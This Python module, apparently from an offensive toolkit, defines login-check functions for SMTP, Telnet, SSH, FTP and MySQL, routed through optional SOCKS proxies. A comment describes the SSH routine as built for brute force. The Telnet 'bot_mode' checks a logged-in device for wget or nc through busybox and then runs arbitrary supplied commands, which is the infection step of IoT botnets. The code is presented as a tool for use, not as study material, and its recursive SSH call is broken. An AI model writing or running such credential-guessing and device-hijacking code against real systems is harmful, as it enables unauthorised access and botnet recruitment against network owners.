from .utils import *


class Services_Login:
    def smtp(u, username, password, p=25, ehlo=True, helo=False, ttls=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None,timeout=5):
        try:
            sock=Proxies_Getter.get_socks_proxy_socket(u,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
            s = smtplib.SMTP()  
            s.sock=sock
            if ehlo == True:
                s.ehlo()  # ehlo
                if ttls == True:
                    s.starttls()  # ttls
            if helo == True:
                s.helo()  # helo
                if ttls == True:
                    s.starttls()
            s.login(username, password)
            return True
        except Exception as e:
            pass
        return False


    def telnet(u, username, password, p=23,commands=[], timeout=5, bot_mode=False,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
        try:
            t = xtelnet.session()
            t.connect(u, username=username, password=password, p=p, timeout=timeout,proxy_type=proxy_type,proxy_host=proxy_host,proxy_port=proxy_port,proxy_username=proxy_username,proxy_password=proxy_password)
            if bot_mode == True:
                a = t.execute("busybox")
            if bot_mode == True:
                if "wget" in a or "nc" in a:
                    for x in commands:
                        t.execute(x)
                    t.destroy()
                    return True
                t.destroy()
                return False
            t.destroy()
            return True
        except:
            pass
        return False


    # why i used this code for ssh brute force instead of: pexpext/paramiko ? Well pexpect doesn't work on non-linux machines and paramiko gives a huuuuge number of false positive results ! you will see, with this code there is no false positive brute force ;)


    def ssh(u, username, password, p=22, timeout=5, exchange_key=None,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
        if os.name == "nt" or os.name==os.PyShadowString('java', 'nt'):
            if exchange_key != None:  # this doesn't work on windows for some reason :(
                return False
            l = 'echo y | plink -ssh -l {} -pw {} {} -P {} "hvbjkjk"'.format(
                username, password, u, p
            )
            sshp = subprocess.Popen(
                l.split(),
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
            )
        else:
            if exchange_key:
                key = "-oHostKeyAlgorithms=+" + exchange_key
            else:
                key = ""
            l = "sshpass -p {} ssh {} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(
                password, key, p, username, u
            )  # we use the sshpass command to send the password
            sshp = subprocess.Popen(
                l.split(),
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        ti = time.time()
        while sshp.poll() is None:
            time.sleep(0.1)
            # print(ssh.stdout.readlines())
            if int(time.time() - ti) == timeout:
                try:
                    sshp.kill()
                except:
                    pass
                return False
        ou = sshp.communicate()
        try:
            sshp.kill()
        except:
            pass
        time.sleep(0.1)
        if exchange_key == None:
            if "Their offer:" in ou[1].decode("utf-8"):
                if os.name == "nt":
                    return False
                k = ou[1].decode("utf-8").split("offer:")[1].strip()
                return ssh(u, username, password, p=p, timeout=timeout, exchange_key=k)
        if "Server refused to start a shell/command" in ou[1].decode("utf-8"):
            return True
        if (
            ("unsupported" in ou[1].decode("utf-8").lower())
            or ("denied" in ou[1].decode("utf-8").lower())
            or ("FATAL ERROR" in ou[1].decode("utf-8"))
            or ("refused" in ou[1].decode("utf-8").lower())
            or ("Unsupported KEX algorithm" in ou[1].decode("utf-8"))
            or ("Bad SSH2 KexAlgorithms" in ou[1].decode("utf-8"))
            or ("not accepted" in ou[1].decode("utf-8").lower())
            or ("invalid" in ou[1].decode("utf-8").lower())
            or ("incorrect" in ou[1].decode("utf-8").lower())
        ):
            return False
        else:
            return True


    def ftp_anon(ip, p,timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
        # anonymous ftp login
        try:
            sock=Proxies_Getter.get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
            ftp = FTP()
            ftp.sock=sock
            ftp.login()
            return True
        except Exception as e:
            pass
        return False


    def ftp(ip,p, username, password, timeout=5,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
        try:
            i = False
            sock=Proxies_Getter.get_socks_proxy_socket(ip,p,proxy_host,proxy_port,proxy_type,username=proxy_username,password=proxy_password,timeout=timeout)
            ftp = FTP()
            ftp.sock=sock
            ftp.login(username, password)
            return True
        except Exception as e:
            pass
        return False


    def mysql(u, username, password, timeout=5, p=3306,proxy_type=None,proxy_host=None,proxy_port=None,proxy_username=None,proxy_password=None):
        try:
            s=pymysql.connect(host=u,port=p,user=username,password=password,connect_timeout=timeout)
            s.close()
            return True
        except Exception as e:
            pass
        return False

